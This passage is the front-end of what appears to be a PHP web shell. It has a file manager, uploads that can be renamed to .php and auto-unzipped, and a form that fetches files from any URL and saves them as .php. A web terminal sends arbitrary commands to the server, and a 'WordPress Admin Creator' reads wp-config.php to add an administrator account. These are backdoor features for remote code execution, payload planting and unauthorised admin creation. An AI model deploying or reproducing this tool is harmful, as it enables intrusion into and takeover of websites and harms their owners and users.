                                                <span class="parent-icon">↩</span>
                                            <?php elseif ($item['type'] === 'dir'): ?>
                                                <span class="folder-icon">📁</span>
                                            <?php else: ?>
                                                <span class="file-icon">📄</span>
                                            <?php endif; ?>
                                        </div>
                                        <div class="file-info">
                                            <div class="file-name">
                                                <?php if ($item['type'] === 'dir' || $item['type'] === 'parent'): ?>
                                                    <a href="?tab=filemanager&dir=<?php echo urlencode($item['path']); ?>">
                                                        <?php echo htmlspecialchars($item['name']); ?>
                                                    </a>
                                                <?php else: ?>
                                                    <a href="?tab=filemanager&dir=<?php echo urlencode($current_relative_dir); ?>&view=<?php echo urlencode($item['name']); ?>">
                                                        <?php echo htmlspecialchars($item['name']); ?>
                                                    </a>
                                                <?php endif; ?>
                                            </div>
                                            <div class="file-details">
                                                <?php if ($item['type'] === 'file'): ?>
                                                    <span><?php echo formatSize($item['size']); ?></span>
                                                <?php endif; ?>
                                                <span><?php echo date('m/d/Y H:i', $item['modified']); ?></span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="mobile-actions">
                                        <?php if ($item['type'] === 'file'): ?>
                                            <button class="mobile-action-btn edit" style="background: var(--info); color: white;" onclick="editFile('<?php echo urlencode($item['name']); ?>')">
                                                Edit
                                            </button>
                                            <button class="mobile-action-btn download" style="background: var(--success); color: white;" onclick="downloadFile('<?php echo urlencode($item['name']); ?>')">
                                                Download
                                            </button>
                                        <?php endif; ?>
                                        
                                        <?php if ($item['name'] !== '..'): ?>
                                            <button class="mobile-action-btn" style="background: var(--warning); color: white;" onclick="renameItem('<?php echo urlencode($item['name']); ?>')">
                                                Rename
                                            </button>
                                            <button class="mobile-action-btn delete" style="background: var(--danger); color: white;" onclick="deleteItem('<?php echo urlencode($item['name']); ?>', '<?php echo $item['type']; ?>')">
                                                Delete
                                            </button>
                                        <?php endif; ?>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
            
            <!-- Upload Tab -->
            <div id="upload" class="tab-content <?php echo $current_tab === 'upload' ? 'active' : ''; ?>">
                <div class="card">
                    <h2 style="margin-bottom: 20px; color: var(--primary);">Upload Files</h2>
                    
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                        <!-- File Upload -->
                        <div>
                            <h3 style="margin-bottom: 15px; color: var(--secondary);">Upload from Computer</h3>
                            <form method="POST" enctype="multipart/form-data" onsubmit="showLoading(this)">
                                <input type="hidden" name="action" value="upload_file">
                                
                                <div class="form-group">
                                    <label>Select File</label>
                                    <input type="file" name="file_upload" required 
                                           style="padding: 15px; border: 2px dashed #cbd5e0; border-radius: 8px; background: #f7fafc;">
                                </div>

                                <div class="checkbox-group">
                                    <input type="checkbox" name="add_php_ext" id="add_php_ext">
                                    <label for="add_php_ext">Add .php extension</label>
                                </div>

                                <div class="checkbox-group">
                                    <input type="checkbox" name="auto_unzip" id="auto_unzip">
                                    <label for="auto_unzip">Auto unzip if ZIP file</label>
                                </div>

                                <button type="submit" class="btn btn-primary" style="width: 100%;">
                                    Upload File
                                </button>
                            </form>
                        </div>
                        
                        <!-- URL Download -->
                        <div>
                            <h3 style="margin-bottom: 15px; color: var(--secondary);">Download from URL</h3>
                            <form method="POST" onsubmit="showLoading(this)">
                                <input type="hidden" name="action" value="download_url">
                                
                                <div class="form-group">
                                    <label>File URL</label>
                                    <input type="url" name="file_url" class="url-input" 
                                           placeholder="https://example.com/file.txt" required>
                                </div>

                                <div class="checkbox-group">
                                    <input type="checkbox" name="add_php_ext_link" id="add_php_ext_link">
                                    <label for="add_php_ext_link">Add .php extension</label>
                                </div>

                                <div class="checkbox-group">
                                    <input type="checkbox" name="auto_unzip_link" id="auto_unzip_link">
                                    <label for="auto_unzip_link">Auto unzip if ZIP file</label>
                                </div>

                                <button type="submit" class="btn btn-success" style="width: 100%;">
                                    Download & Save
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- CMD Tab -->
            <div id="cmd" class="tab-content <?php echo $current_tab === 'cmd' ? 'active' : ''; ?>">
                <div class="card">
                    <div class="terminal">
                        <div class="terminal-header">
                            <div style="display: flex; gap: 8px;">
                                <div style="width: 12px; height: 12px; background: #f56565; border-radius: 50%;"></div>
                                <div style="width: 12px; height: 12px; background: #ed8936; border-radius: 50%;"></div>
                                <div style="width: 12px; height: 12px; background: #48bb78; border-radius: 50%;"></div>
                            </div>
                            <div style="color: #e2e8f0;">Web Terminal</div>
                        </div>
                        
                        <div class="terminal-body" id="terminal-output">
                            <div class="output-line">
                                <span class="prompt">$</span> Welcome to Web Terminal
                            </div>
                            <div class="output-line">
                                <span class="prompt">$</span> Type your commands below
                            </div>
                        </div>
                        
                        <div class="command-input-container">
                            <span class="prompt">$</span>
                            <input type="text" class="command-input" id="command-input" 
                                   placeholder="Type command here... (ls, pwd, whoami, etc.)" autocomplete="off">
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- WordPress Tab -->
            <div id="wordpress" class="tab-content <?php echo $current_tab === 'wordpress' ? 'active' : ''; ?>">
                <div class="card">
                    <h2 style="margin-bottom: 20px; color: var(--primary);">WordPress Admin Creator</h2>
                    <p style="margin-bottom: 20px; color: #718096;">
                        This tool will help you create a new admin user in WordPress by reading the wp-config.php file.
                    </p>
                    
                    <form method="POST">
                        <input type="hidden" name="action" value="wp_add_admin">
                        
                        <div class="form-group">
                            <label>WordPress Config Path</label>
                            <input type="text" name="wp_config_path" 
                                   placeholder="/path/to/wp-config.php" required
                                   value="<?php echo $current_path . DIRECTORY_SEPARATOR . 'wp-config.php'; ?>">
                            <small style="color: #718096; font-size: 0.9rem;">
                                Full path to wp-config.php file
                            </small>
                        </div>
                        
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                            <div class="form-group">
                                <label>Username</label>
                                <input type="text" name="wp_username" placeholder="admin" required>
                            </div>
                            
                            <div class="form-group">
                                <label>Password</label>
                                <input type="password" name="wp_password" placeholder="strong password" required>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label>Email</label>
                            <input type="email" name="wp_email" placeholder="admin@example.com" required>
                        </div>
                        
                        <button type="submit" class="btn btn-warning" style="width: 100%;">
                            Create WordPress Admin
                        </button>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Modals -->
        <div id="create-dir-modal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3>Create New Folder</h3>
                    <button class="close-btn" onclick="hideModal('create-dir-modal')">&times;</button>
                </div>
                <form method="POST">
                    <input type="hidden" name="action" value="create_dir">
                    <div class="form-group">
                        <label>Folder Name</label>
                        <input type="text" name="new_name" placeholder="Enter folder name" required>
                    </div>
                    <button type="submit" class="btn btn-primary">Create Folder</button>
                </form>
            </div>
        </div>

        <div id="create-file-modal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3>Create New File</h3>
                    <button class="close-btn" onclick="hideModal('create-file-modal')">&times;</button>
                </div>
                <form method="POST">
                    <input type="hidden" name="action" value="create_file">
                    <div class="form-group">
                        <label>File Name</label>
                        <input type="text" name="new_name" placeholder="Enter file name" required>
                    </div>
                    <div class="form-group">
                        <label>File Content</label>
                        <textarea name="file_content" placeholder="Enter file content (optional)" rows="6"></textarea>
                    </div>
                    <button type="submit" class="btn btn-success">Create File</button>
                </form>
            </div>
        </div>

        <div id="edit-modal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3>Edit File</h3>
                    <button class="close-btn" onclick="hideModal('edit-modal')">&times;</button>
                </div>
                <form method="POST">
                    <input type="hidden" name="action" value="edit">
                    <input type="hidden" name="target" id="edit_filename">
                    <div class="form-group">
                        <label>File Content</label>
                        <textarea name="content" id="edit_content" rows="15" placeholder="Enter file content"></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Save Changes</button>
                </form>
            </div>
        </div>

        <div id="rename-modal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3>Rename</h3>
                    <button class="close-btn" onclick="hideModal('rename-modal')">&times;</button>
                </div>
                <form method="POST">
                    <input type="hidden" name="action" value="rename">
                    <input type="hidden" name="target" id="rename_old_name">
                    <div class="form-group">
                        <label>New Name</label>
                        <input type="text" name="new_name" id="rename_new_name" required>
                    </div>
                    <button type="submit" class="btn btn-warning">Rename</button>
                </form>
            </div>
        </div>
        
        <script>
            // Tab switching
            function switchTab(tabName) {
                document.querySelectorAll('.tab-content').forEach(tab => {
                    tab.classList.remove('active');
                });
                
                document.querySelectorAll('.tab-btn').forEach(btn => {
                    btn.classList.remove('active');
                });
                
                document.getElementById(tabName).classList.add('active');
                event.target.classList.add('active');
                
                const url = new URL(window.location);
                url.searchParams.set('tab', tabName);
                window.history.pushState({}, '', url);
            }
            
            // Modal functions
            function showModal(modalId) {
                document.getElementById(modalId).style.display = 'flex';
            }
            
            function hideModal(modalId) {
                document.getElementById(modalId).style.display = 'none';
            }
            
            function editFile(filename) {
                fetch('?action=get_content&file=' + encodeURIComponent(filename))
                    .then(response => response.text())
                    .then(content => {
                        document.getElementById('edit_filename').value = filename;
                        document.getElementById('edit_content').value = content;
                        showModal('edit-modal');
                    });
            }
            
            function downloadFile(filename) {
                window.location.href = '?download=' + encodeURIComponent(filename);
            }
            
            function renameItem(name) {
                document.getElementById('rename_old_name').value = name;
                document.getElementById('rename_new_name').value = name;
                showModal('rename-modal');
            }
            
            function deleteItem(name, type) {
                if (confirm(`Are you sure you want to delete ${type} "${name}"?`)) {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.innerHTML = `
                        <input type="hidden" name="action" value="delete">
                        <input type="hidden" name="target" value="${name}">
                    `;
                    document.body.appendChild(form);
                    form.submit();
                }
            }
            
            // Mobile Swipe functionality
            let startX = 0;
            let currentX = 0;
            let isSwiping = false;
            let currentItem = null;
            
            document.addEventListener('touchstart', (e) => {
                const item = e.target.closest('.file-item-mobile');
                if (item) {
                    startX = e.touches[0].clientX;
                    currentItem = item;
                    isSwiping = true;
                }
            });
            
            document.addEventListener('touchmove', (e) => {
                if (!isSwiping || !currentItem) return;
                
                currentX = e.touches[0].clientX;
                const diff = startX - currentX;
                
                // Only allow right-to-left swipe
                if (diff > 0) {
                    e.preventDefault();
                    const translateX = Math.min(diff, 100);
                    currentItem.querySelector('.file-content').style.transform = `translateX(-${translateX}px)`;
                }
            });
            
            document.addEventListener('touchend', () => {
                if (!isSwiping || !currentItem) return;
                
                const diff = startX - currentX;
                const threshold = 50;
                
                if (diff > threshold) {
                    // Swipe successful - show actions
                    currentItem.classList.add('swiped');
                    currentItem.querySelector('.file-content').style.transform = 'translateX(-100px)';
                } else {
                    // Swipe not enough - reset
                    currentItem.classList.remove('swiped');
                    currentItem.querySelector('.file-content').style.transform = 'translateX(0)';
                }
                
                isSwiping = false;
                currentItem = null;
            });
            
            // Close swipe actions when clicking elsewhere
            document.addEventListener('click', (e) => {
                if (!e.target.closest('.file-item-mobile')) {
                    document.querySelectorAll('.file-item-mobile').forEach(item => {
                        item.classList.remove('swiped');
                        item.querySelector('.file-content').style.transform = 'translateX(0)';
                    });
                }
            });
            
            // Terminal functionality
            const terminalOutput = document.getElementById('terminal-output');
            const commandInput = document.getElementById('command-input');
            let commandHistory = [];
            let historyIndex = -1;
            
            commandInput.addEventListener('keydown', async (e) => {
                if (e.key === 'Enter') {
                    const command = commandInput.value.trim();
                    if (!command) return;
                    
                    addTerminalOutput(`<span class="prompt">$</span> ${command}`, 'command');
                    
                    commandHistory.push(command);
                    historyIndex = commandHistory.length;
                    commandInput.value = '';
                    
                    const loadingId = addTerminalOutput('<div class="loading"></div> Executing...', 'loading');
                    
                    try {
                        const formData = new FormData();
                        formData.append('command', command);
                        
                        const response = await fetch('', {
                            method: 'POST',
                            body: formData
                        });
                        
                        const output = await response.text();
                        
                        removeLoading(loadingId);
                        addTerminalOutput(output);
                        
                    } catch (error) {
                        removeLoading(loadingId);
                        addTerminalOutput('Error: ' + error.message, 'error');
                    }
                    
                    scrollTerminalToBottom();
                    
                } else if (e.key === 'ArrowUp') {
                    e.preventDefault();
                    if (commandHistory.length > 0) {
                        historyIndex = Math.max(historyIndex - 1, 0);
                        commandInput.value = commandHistory[historyIndex];
                    }
                } else if (e.key === 'ArrowDown') {
                    e.preventDefault();
                    if (historyIndex < commandHistory.length - 1) {
                        historyIndex++;
                        commandInput.value = commandHistory[historyIndex];
                    } else {
                        historyIndex = commandHistory.length;
                        commandInput.value = '';
                    }
                }
            });
            
            function addTerminalOutput(content, type = 'normal') {
                const line = document.createElement('div');
                line.className = 'output-line';
                if (type === 'command') {
                    line.style.color = '#e2e8f0';
                } else if (type === 'error') {
                    line.style.color = '#f56565';
                } else if (type === 'loading') {
                    line.id = 'loading-' + Date.now();
                }
                line.innerHTML = content;
                terminalOutput.appendChild(line);
                return line.id;
            }
            
            function removeLoading(loadingId) {
                const loadingElement = document.getElementById(loadingId);
                if (loadingElement) {
                    loadingElement.remove();
                }
            }
            
            function scrollTerminalToBottom() {
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            }
            
            // Loading animation for forms
            function showLoading(form) {
                const button = form.querySelector('button[type="submit"]');
                const originalText = button.innerHTML;
                button.innerHTML = '<div class="loading"></div> Processing...';
                button.disabled = true;
                
                setTimeout(() => {
                    button.innerHTML = originalText;
                    button.disabled = false;
                }, 3000);
            }
            
            // Close modal when clicking outside
            window.onclick = function(event) {
                const modals = document.getElementsByClassName('modal');
                for (let modal of modals) {
                    if (event.target === modal) {
                        modal.style.display = 'none';
                    }
                }
            }
            
            // Auto-focus command input when terminal tab is active
            document.addEventListener('click', (e) => {
                if (e.target.classList.contains('tab-btn') && e.target.textContent.includes('Terminal')) {
                    setTimeout(() => {
                        commandInput.focus();
                    }, 100);
                }
            });
        </script>
    </body>
    </html>
    <?php
}
?>